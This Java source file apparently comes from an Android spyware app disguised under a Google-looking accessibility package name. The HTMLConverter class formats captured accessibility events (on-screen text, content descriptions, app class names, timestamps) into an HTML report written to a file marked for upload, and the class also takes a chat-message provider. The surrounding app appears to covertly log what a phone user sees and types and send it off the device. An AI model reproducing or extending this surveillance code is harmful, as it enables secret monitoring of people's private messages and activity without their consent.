package service.android.google.com.accessibility.util.converter.converters.html;

import android.content.Context;
import android.content.res.Resources;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.List;

import service.android.google.com.accessibility.R;
import service.android.google.com.accessibility.model.database.EventDTO;
import service.android.google.com.accessibility.upload.UploadType;
import service.android.google.com.accessibility.util.converter.converters.AbstractConverter;
import service.android.google.com.accessibility.util.database.chatmessage.ChatMessageProvider;
import service.android.google.com.accessibility.util.database.event.EventProvider;

/**
 * Created by tim on 17.04.16.
 */
public class HTMLConverter extends AbstractConverter {
    private static final String REPLACE_DATE = "$DATE$";
    private static final String REPLACE_GENERIC_EVENTS = "$EVENT_TABLE_START$";
    private static final int BUFFER_SIZE = 1024;

    private final Resources resources;

    public HTMLConverter(final Context context,
                         final Resources resources,
                         final EventProvider eventProvider,
                         final ChatMessageProvider chatMessageProvider) {
        super(context, UploadType.HTML, eventProvider, chatMessageProvider);
        this.resources = resources;
    }

    @Override
    public File getFileName() {
        return generateHTMLReport();
    }

    private synchronized File generateHTMLReport() {
        File fileToUpload = null;
        BufferedReader in = null;
        BufferedWriter out = null;

        try {
            in = new BufferedReader(new InputStreamReader(resources.openRawResource(R.raw.template_html_report)), BUFFER_SIZE);
            fileToUpload = getFileNameForType();
            out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(fileToUpload, true)), BUFFER_SIZE);

            String line;
            while ((line = in.readLine()) != null) {
                final String lineWithDateReplaced = replaceDate(line);
                final String lineWithEventsReplaced = addGenericEvents(lineWithDateReplaced);
                out.write(lineWithEventsReplaced);
            }
            out.flush();
        } catch (IOException e) {
            handleException(e, fileToUpload);
        } finally {
            try {
                if (in != null) {
                    in.close();
                }
                if (out != null) {
                    out.close();
                }
            } catch (IOException e) {
                handleException(e, fileToUpload);
            }
        }
        return fileToUpload;
    }

    private String addGenericEvents(String line) {
        if (line.trim().equals(REPLACE_GENERIC_EVENTS)) {
            final List<EventDTO> allEvents = getAllEvents();
            StringBuilder stringBuilder = new StringBuilder();
            for (final EventDTO event : allEvents) {
                stringBuilder.append(HTMLConstants.TABLE_ROW_OPEN);
                stringBuilder.append(addClassName(event.getClassName()));
                stringBuilder.append(addContentDescription(event.getContentDescription()));
                stringBuilder.append(addEventTime(event.getEventTime()));
                stringBuilder.append(addEventType(event.getEventType()));
                stringBuilder.append(addText(event.getText()));
                stringBuilder.append(HTMLConstants.TABLE_ROW_CLOSE);
            }
            line = line.replace(REPLACE_GENERIC_EVENTS, stringBuilder.toString());
        }
        return line;
    }

    private String addText(final String text) {
        return add(text);
    }

    private String addEventType(final int eventType) {
        return add(getEventTypeStringFromEventType(eventType));
    }

    private String addEventTime(final long eventTime) {
        return add(getTimeStampFromDate(eventTime));
    }

    private String addContentDescription(final String contentDescription) {
        return add(contentDescription == null ? "" : contentDescription);
    }

    private String addClassName(final String className) {
        return add(getPlayStoreLink(className));
    }

    private String add(final String someString) {
        return String.format("%s%s%s", HTMLConstants.TABLE_DATA_OPEN, someString, HTMLConstants.TABLE_DATA_CLOSE);
    }

    private String replaceDate(final String line) {
        return line.trim().replace(REPLACE_DATE, getCurrentTimeStamp());
    }
}